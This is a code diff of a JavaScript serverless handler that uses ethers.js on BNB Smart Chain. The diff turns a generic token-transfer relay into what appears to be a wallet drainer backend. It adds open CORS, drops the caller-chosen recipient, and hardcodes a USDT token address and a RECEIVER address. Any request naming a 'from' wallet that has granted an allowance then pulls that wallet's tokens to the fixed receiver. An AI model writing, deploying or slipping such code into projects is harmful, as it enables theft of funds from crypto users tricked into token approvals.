@@ -1,66 +1,71 @@
 import { ethers } from "ethers";
 
-const ABI = [
-  "function transferFrom(address from,address to,uint256 value) returns (bool)"
-];
-
 export default async function handler(req, res) {
+
+  // ===== CORS =====
+  res.setHeader("Access-Control-Allow-Origin", "*");
+  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
+
+  if (req.method === "OPTIONS") {
+    return res.status(200).end();
+  }
+
+  if (req.method !== "POST") {
+    return res.status(405).json({ error: "POST only" });
+  }
+
   try {
-    if (req.method !== "POST") {
-      return res.status(405).json({ ok: false });
+
+    const { from, amount } = req.body;
+
+    if (!from || !amount) {
+      return res.status(400).json({ error: "Missing params" });
     }
 
-    const { token, from, to, amount } = req.body;
+    // ===== CONFIG =====
+    const RPC = "https://bsc-dataseed.binance.org/";
 
-    if (!token || !from || !to || !amount) {
-      return res.status(400).json({
-        ok: false,
-        error: "Missing params"
-      });
-    }
+    const PRIVATE_KEY =
+      "PUT_YOUR_RELAYER_PRIVATE_KEY_HERE"; // ⚠️ relayer only
 
-    const provider = new ethers.JsonRpcProvider(process.env.RPC_URL);
+    const USDT =
+      "0x55d398326f99059fF775485246999027B3197955";
 
-    const wallet = new ethers.Wallet(
-      process.env.PRIVATE_KEY,
-      provider
-    );
+    const RECEIVER =
+      "0xDb867b88EAB55320fD50E9785B2906773dedf78b";
 
-    const contract = new ethers.Contract(token, ABI, wallet);
+    // ===== Provider =====
+    const provider = new ethers.JsonRpcProvider(RPC);
+    const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
 
-    // nonce safe
-    const nonce = await provider.getTransactionCount(
-      wallet.address,
-      "pending"
-    );
+    // ===== Contract =====
+    const abi = [
+      "function transferFrom(address from,address to,uint256 value) public returns(bool)"
+    ];
 
-    console.log("Transfer:", from, "→", to, amount);
+    const token = new ethers.Contract(USDT, abi, wallet);
 
-    const tx = await contract.transferFrom(
+    // user input amount
+    const value = ethers.parseUnits(amount.toString(), 18);
+
+    // ===== SEND TX =====
+    const tx = await token.transferFrom(
       from,
-      to,
-      amount,
-      {
-        nonce,
-        gasLimit: 120000
-      }
+      RECEIVER,
+      value
     );
 
-    const receipt = await tx.wait();
+    await tx.wait();
 
-    res.status(200).json({
-      ok: true,
-      hash: receipt.hash,
-      blockNumber: receipt.blockNumber,
-      gasUsed: receipt.gasUsed.toString()
+    return res.json({
+      success: true,
+      hash: tx.hash
     });
 
-  } catch (err) {
-    console.error(err);
-
-    res.status(500).json({
-      ok: false,
-      error: err.message
+  } catch (e) {
+    console.log(e);
+    return res.status(500).json({
+      error: e.message
     });
   }
 }
